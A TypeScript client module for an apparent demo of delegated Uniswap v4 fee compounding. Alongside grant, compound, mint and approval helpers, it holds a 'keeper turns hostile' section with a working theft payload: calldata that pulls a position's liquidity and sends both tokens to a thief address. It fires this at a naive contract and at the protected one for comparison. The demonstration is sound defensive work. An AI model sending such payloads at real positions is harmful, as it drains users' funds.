import {
  encodeAbiParameters,
  encodePacked,
  parseAbiItem,
  toFunctionSelector,
  type Address,
  type Hex,
  type WalletClient
} from "viem";
import {publicClient, envoyageAbi, posmAbi} from "./envoyage";
import {parseEventLogs} from "viem";
import {ENVOYAGE, POSITION_MANAGER, CHAIN} from "./config";

// ── owner ─────────────────────────────────────────────────────────────────────

export type Terms = {
  keeper: Address;
  tokenId: bigint;
  maxFeeBps: number;
  feeRecipient: Address;
  minInterval: bigint;
  expiry: bigint;
};

export async function approvePosition(w: WalletClient, tokenId: bigint, to: Address): Promise<Hex> {
  const hash = await w.writeContract({
    account: w.account!,
    chain: CHAIN,
    address: POSITION_MANAGER,
    abi: [parseAbiItem("function approve(address to, uint256 tokenId)")],
    functionName: "approve",
    args: [to, tokenId]
  });
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

export async function grant(w: WalletClient, t: Terms): Promise<{hash: Hex; mandateId: bigint}> {
  // Simulated first so a refusal surfaces as a named error before any gas is spent.
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: ENVOYAGE,
    abi: envoyageAbi,
    functionName: "grant",
    args: [
      {
        keeper: t.keeper,
        // Ignored by the contract, which overwrites it with msg.sender. Left visible
        // because the fact that it is ignored is the point.
        grantor: "0x0000000000000000000000000000000000000000",
        tokenId: t.tokenId,
        maxFeeBps: t.maxFeeBps,
        feeRecipient: t.feeRecipient,
        expiry: t.expiry,
        minInterval: t.minInterval,
        lastCall: 0n,
        compoundAllowed: true
      }
    ]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  const receipt = await publicClient.waitForTransactionReceipt({hash});
  // The realised id comes from the emitted event, never from the simulation's
  // return value — that was nextMandateId at simulation time and a racing grant
  // would make it wrong. (CLAUDE.md: a simulated value is not a realised one.)
  const events = parseEventLogs({abi: envoyageAbi, logs: receipt.logs, eventName: "MandateGranted"});
  const mandateId = (events[0] as {args: {id: bigint}} | undefined)?.args.id;
  if (mandateId === undefined) throw new Error("grant landed but emitted no MandateGranted");
  return {hash, mandateId};
}

export async function revoke(w: WalletClient, mandateId: bigint): Promise<Hex> {
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: ENVOYAGE,
    abi: envoyageAbi,
    functionName: "revoke",
    args: [mandateId]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

// ── keeper ────────────────────────────────────────────────────────────────────

export async function compound(w: WalletClient, mandateId: bigint): Promise<Hex> {
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: ENVOYAGE,
    abi: envoyageAbi,
    functionName: "compound",
    args: [mandateId, 0n]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

// ── keeper turns hostile ──────────────────────────────────────────────────────

/// Uniswap v4 action opcodes, from v4-periphery/src/libraries/Actions.sol.
const DECREASE_LIQUIDITY = 0x01;
const TAKE_PAIR = 0x11;

/// The Revert Lend H-04 attack, byte for byte what test/replay/ExploitReplay.t.sol
/// sends: pull liquidity out of the position, deliver both tokens to `thief`.
///
/// This is built ONCE and sent to both targets unchanged. If the two calls carried
/// different calldata the comparison would be rigged; the only variable is the
/// contract on the receiving end.
export function buildTheftActions(tokenId: bigint, currency0: Address, currency1: Address, thief: Address, liquidity: bigint): Hex {
  const actions = encodePacked(["uint8", "uint8"], [DECREASE_LIQUIDITY, TAKE_PAIR]);
  const params: Hex[] = [
    encodeAbiParameters(
      [{type: "uint256"}, {type: "uint256"}, {type: "uint128"}, {type: "uint128"}, {type: "bytes"}],
      [tokenId, liquidity, 0n, 0n, "0x"]
    ),
    encodeAbiParameters([{type: "address"}, {type: "address"}, {type: "address"}], [currency0, currency1, thief])
  ];
  return encodeAbiParameters([{type: "bytes"}, {type: "bytes[]"}], [actions, params]);
}

export const NAIVE_EXECUTE = parseAbiItem("function execute(uint256 tokenId, bytes actions)");

/// Sends the theft to the naive contract. Expected to SUCCEED — that is the point.
export async function stealViaNaive(w: WalletClient, naive: Address, tokenId: bigint, actions: Hex): Promise<Hex> {
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: naive,
    abi: [NAIVE_EXECUTE],
    functionName: "execute",
    args: [tokenId, actions]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

/// The selector for the naive contract's entrypoint, and whether Envoyage's ABI has
/// any function with it. Computed once, defensively — a throw here must not take the
/// evidence down with it.
function theftSelector(): {selector: Hex; existsOnAbi: boolean} {
  const selector = toFunctionSelector("execute(uint256,bytes)");
  let existsOnAbi = false;
  for (const f of envoyageAbi) {
    if (f.type !== "function") continue;
    try {
      if (toFunctionSelector(f as never) === selector) existsOnAbi = true;
    } catch {
      /* a non-function-shaped entry can't match; ignore */
    }
  }
  return {selector, existsOnAbi};
}

function theftCalldata(tokenId: bigint, actions: Hex): Hex {
  const {selector} = theftSelector();
  return (selector + encodeAbiParameters([{type: "uint256"}, {type: "bytes"}], [tokenId, actions]).slice(2)) as Hex;
}

/// Preflight, via eth_call: no wallet, no gas. Renders WHY before anyone signs, the
/// same way canCompound explains a refusal before compound is sent.
export async function previewTheftAgainstEnvoyage(tokenId: bigint, actions: Hex, from: Address): Promise<{selector: Hex; existsOnAbi: boolean; reverted: boolean; detail: string}> {
  const {selector, existsOnAbi} = theftSelector();
  try {
    await publicClient.call({account: from, to: ENVOYAGE, data: theftCalldata(tokenId, actions)});
    return {selector, existsOnAbi, reverted: false, detail: "call did not revert"};
  } catch {
    // The revert data is empty: the dispatcher found no selector and reverted before
    // any code ran. That empty revert is the evidence, so its shape is what we report,
    // not viem's exception text.
    return {selector, existsOnAbi, reverted: true, detail: "reverted with no data — no function matched the selector"};
  }
}

/// The SAME calldata as a REAL transaction from the same wallet. It reverts on chain
/// and burns gas, leaving a FAILED transaction on Etherscan beside the successful
/// theft against the naive contract. An eth_call would only prove the app chose not
/// to send it; a mined failure proves the chain refused it.
export async function stealViaEnvoyage(w: WalletClient, tokenId: bigint, actions: Hex): Promise<{hash: Hex; status: "success" | "reverted"}> {
  const hash = await w.sendTransaction({
    account: w.account!,
    chain: CHAIN,
    to: ENVOYAGE,
    data: theftCalldata(tokenId, actions),
    // Fixed gas: the wallet cannot estimate a call it predicts will revert, and
    // without this it refuses to send at all, so there would be no failed tx to show.
    gas: 120_000n
  });
  const receipt = await publicClient.waitForTransactionReceipt({hash});
  return {hash, status: receipt.status};
}

// ── reads used by the flows ───────────────────────────────────────────────────

export async function ownerOf(tokenId: bigint): Promise<Address | null> {
  return (await publicClient
    .readContract({address: POSITION_MANAGER, abi: posmAbi, functionName: "ownerOf", args: [tokenId]})
    .catch(() => null)) as Address | null;
}

export async function positionLiquidity(tokenId: bigint): Promise<bigint> {
  return (await publicClient.readContract({
    address: POSITION_MANAGER,
    abi: [parseAbiItem("function getPositionLiquidity(uint256 tokenId) view returns (uint128)")],
    functionName: "getPositionLiquidity",
    args: [tokenId]
  })) as bigint;
}

export async function positionCurrencies(tokenId: bigint): Promise<{currency0: Address; currency1: Address}> {
  const r = (await publicClient.readContract({
    address: POSITION_MANAGER,
    abi: [
      parseAbiItem(
        "function getPoolAndPositionInfo(uint256 tokenId) view returns ((address currency0, address currency1, uint24 fee, int24 tickSpacing, address hooks) poolKey, uint256 info)"
      )
    ],
    functionName: "getPoolAndPositionInfo",
    args: [tokenId]
  })) as unknown as readonly [{currency0: Address; currency1: Address}, bigint];
  return {currency0: r[0].currency0, currency1: r[0].currency1};
}

export async function erc20Balance(token: Address, who: Address): Promise<bigint> {
  return (await publicClient.readContract({
    address: token,
    abi: [parseAbiItem("function balanceOf(address) view returns (uint256)")],
    functionName: "balanceOf",
    args: [who]
  })) as bigint;
}

// ── app writes and reads (Unit 1) ─────────────────────────────────────────────
//
// Every write below is simulate-then-send, the shape `grant` set. Errors are left
// for the caller to decode through ui/revert.ts, so this file never grows a
// hard-coded selector.

import {
  DEMO_POOL,
  PERMIT2,
  STATE_VIEW,
  ENVOYAGE_NAMES,
  DEMO_MINT_LIQUIDITY,
  DEMO_TOKEN_MINT
} from "./config";
import {readCanCompound, REFUSAL_REASONS, type Mandate} from "./envoyage";

const MINT_POSITION = 0x02;
const SETTLE_PAIR = 0x0d;

const namesWriteAbi = [
  parseAbiItem("function publish(uint256 mandateId) returns (uint256 tokenId)"),
  parseAbiItem("function retire(uint256 mandateId, uint256 positionId)")
] as const;

const erc20Abi = [
  parseAbiItem("function approve(address spender, uint256 amount) returns (bool)"),
  parseAbiItem("function allowance(address owner, address spender) view returns (uint256)"),
  parseAbiItem("function mint(address to, uint256 amount)")
] as const;

const permit2Abi = [
  parseAbiItem("function approve(address token, address spender, uint160 amount, uint48 expiration)"),
  parseAbiItem("function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)")
] as const;

const posmWriteAbi = [
  parseAbiItem("function modifyLiquidities(bytes unlockData, uint256 deadline) payable"),
  parseAbiItem("function nextTokenId() view returns (uint256)")
] as const;

const stateViewAbi = [
  parseAbiItem("function getSlot0(bytes32 poolId) view returns (uint160 sqrtPriceX96, int24 tick, uint24 protocolFee, uint24 lpFee)")
] as const;

const POOL_KEY_TYPE = {
  type: "tuple",
  components: [
    {name: "currency0", type: "address"},
    {name: "currency1", type: "address"},
    {name: "fee", type: "uint24"},
    {name: "tickSpacing", type: "int24"},
    {name: "hooks", type: "address"}
  ]
} as const;

const MAX_UINT128 = (1n << 128n) - 1n;
const MAX_UINT160 = (1n << 160n) - 1n;
const MAX_UINT48 = (1n << 48n) - 1n;
const MAX_UINT256 = (1n << 256n) - 1n;

import {keccak256} from "viem";

/// keccak256(abi.encode(poolKey)) — v4's PoolId.
export function demoPoolId(): Hex {
  return keccak256(encodeAbiParameters([POOL_KEY_TYPE], [DEMO_POOL]));
}

/// The pool's current tick, from StateView.
export async function currentTick(): Promise<{tick: number; sqrtPriceX96: bigint}> {
  const r = (await publicClient.readContract({
    address: STATE_VIEW,
    abi: stateViewAbi,
    functionName: "getSlot0",
    args: [demoPoolId()]
  })) as readonly [bigint, number, number, number];
  return {sqrtPriceX96: r[0], tick: Number(r[1])};
}

/// A range of ±`spacings` tick spacings centred on the CURRENT tick, snapped down
/// to the spacing. A position minted at a fixed 1:1 in a pool that has drifted
/// earns nothing; this one sits where the trades are.
export function rangeAroundTick(tick: number, tickSpacing: number, spacings = 10): {tickLower: number; tickUpper: number} {
  const snapped = Math.floor(tick / tickSpacing) * tickSpacing;
  return {tickLower: snapped - tickSpacing * spacings, tickUpper: snapped + tickSpacing * spacings};
}

/// MINT_POSITION + SETTLE_PAIR, encoded exactly as script/01_DeployAndSeed.s.sol
/// `_mintPosition` does it.
export function buildMintActions(owner: Address, tickLower: number, tickUpper: number, liquidity: bigint): Hex {
  const actions = encodePacked(["uint8", "uint8"], [MINT_POSITION, SETTLE_PAIR]);
  const params: Hex[] = [
    encodeAbiParameters(
      [POOL_KEY_TYPE, {type: "int24"}, {type: "int24"}, {type: "uint256"}, {type: "uint128"}, {type: "uint128"}, {type: "address"}, {type: "bytes"}],
      [DEMO_POOL, tickLower, tickUpper, liquidity, MAX_UINT128, MAX_UINT128, owner, "0x"]
    ),
    encodeAbiParameters([{type: "address"}, {type: "address"}], [DEMO_POOL.currency0, DEMO_POOL.currency1])
  ];
  return encodeAbiParameters([{type: "bytes"}, {type: "bytes[]"}], [actions, params]);
}

export async function mintDemoTokens(w: WalletClient, token: Address, amount = DEMO_TOKEN_MINT): Promise<Hex> {
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: token,
    abi: erc20Abi,
    functionName: "mint",
    args: [w.account!.address, amount]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

export async function erc20Allowance(token: Address, owner: Address, spender: Address): Promise<bigint> {
  return (await publicClient.readContract({address: token, abi: erc20Abi, functionName: "allowance", args: [owner, spender]})) as bigint;
}

/// Hop one of two: the token to Permit2.
export async function approveTokenToPermit2(w: WalletClient, token: Address): Promise<Hex> {
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: token,
    abi: erc20Abi,
    functionName: "approve",
    args: [PERMIT2, MAX_UINT256]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

export async function permit2Allowance(owner: Address, token: Address): Promise<{amount: bigint; expiration: number}> {
  const r = (await publicClient.readContract({
    address: PERMIT2,
    abi: permit2Abi,
    functionName: "allowance",
    args: [owner, token, POSITION_MANAGER]
  })) as readonly [bigint, number, number];
  return {amount: r[0], expiration: Number(r[1])};
}

/// Hop two of two: Permit2 to the PositionManager. Both hops are required; POSM
/// pulls payment through Permit2 whenever the payer is not itself.
export async function approvePermit2ToPosm(w: WalletClient, token: Address): Promise<Hex> {
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: PERMIT2,
    abi: permit2Abi,
    functionName: "approve",
    args: [token, POSITION_MANAGER, MAX_UINT160, Number(MAX_UINT48)]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

export async function nextTokenId(): Promise<bigint> {
  return (await publicClient.readContract({address: POSITION_MANAGER, abi: posmWriteAbi, functionName: "nextTokenId"})) as bigint;
}

/// Mints a demo-pool position for the connected wallet, centred on the current
/// tick. The realised tokenId is read from the Transfer log in the receipt, never
/// from nextTokenId at simulation time.
export async function mintDemoPosition(w: WalletClient, liquidity = DEMO_MINT_LIQUIDITY): Promise<{hash: Hex; tokenId: bigint; tickLower: number; tickUpper: number}> {
  const owner = w.account!.address;
  const {tick} = await currentTick();
  const {tickLower, tickUpper} = rangeAroundTick(tick, DEMO_POOL.tickSpacing);
  const deadline = BigInt(Math.floor(Date.now() / 1000) + 300);
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: POSITION_MANAGER,
    abi: posmWriteAbi,
    functionName: "modifyLiquidities",
    args: [buildMintActions(owner, tickLower, tickUpper, liquidity), deadline]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  const receipt = await publicClient.waitForTransactionReceipt({hash});
  const transfer = parseEventLogs({
    abi: [parseAbiItem("event Transfer(address indexed from, address indexed to, uint256 indexed id)")],
    logs: receipt.logs.filter((l) => l.address.toLowerCase() === POSITION_MANAGER.toLowerCase())
  })[0] as {args: {id: bigint}} | undefined;
  if (!transfer) throw new Error("mint landed but the PositionManager emitted no Transfer");
  return {hash, tokenId: transfer.args.id, tickLower, tickUpper};
}

export async function publishName(w: WalletClient, mandateId: bigint): Promise<Hex> {
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: ENVOYAGE_NAMES,
    abi: namesWriteAbi,
    functionName: "publish",
    args: [mandateId]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

export async function retireName(w: WalletClient, mandateId: bigint, positionId: bigint): Promise<Hex> {
  const {request} = await publicClient.simulateContract({
    account: w.account!,
    address: ENVOYAGE_NAMES,
    abi: namesWriteAbi,
    functionName: "retire",
    args: [mandateId, positionId]
  });
  const hash = await w.writeContract({...request, chain: CHAIN});
  await publicClient.waitForTransactionReceipt({hash});
  return hash;
}

// ── pre-flight ────────────────────────────────────────────────────────────────

export type Preflight = {
  /// The contract's own gate, from canCompound(): 0x00000000 when open.
  gate: Hex;
  /// What a compound from the keeper would do right now.
  verdict: "may act" | "no fees yet" | "refused";
  /// One sentence, for the screen.
  sentence: string;
  /// The decoded error name behind a refusal, when there is one.
  error: string | null;
};

/// canCompound() plus a simulated compound() from the keeper account. canCompound
/// cannot see fee availability, so the simulation is what turns "allowed" into
/// "allowed, and there is something to do". Throws when the chain cannot be read —
/// a failed read must never come back as "may act".
export async function preflight(
  mandateId: bigint,
  keeper: Address,
  mandate?: Mandate | null,
  explain?: (e: unknown, ctx: {mandate?: Mandate | null}) => string,
  nameOf?: (e: unknown) => string | null
): Promise<Preflight> {
  const gate = await readCanCompound(mandateId);
  if (gate !== "0x00000000") {
    const text = REFUSAL_REASONS[gate] ?? `refused with selector ${gate}`;
    return {gate, verdict: "refused", sentence: text, error: null};
  }
  try {
    await publicClient.simulateContract({
      account: keeper,
      address: ENVOYAGE,
      abi: envoyageAbi,
      functionName: "compound",
      args: [mandateId, 0n]
    });
    return {gate, verdict: "may act", sentence: "Fees are waiting; the bot may compound now.", error: null};
  } catch (e) {
    const name = nameOf ? nameOf(e) : null;
    if (name === "ZeroLiquidityDelta" || name === "FeeBelowMinimum") {
      return {gate, verdict: "no fees yet", sentence: "No fees have accrued since the last compound — nothing to reinvest yet.", error: name};
    }
    return {gate, verdict: "refused", sentence: explain ? explain(e, {mandate}) : String(e), error: name};
  }
}
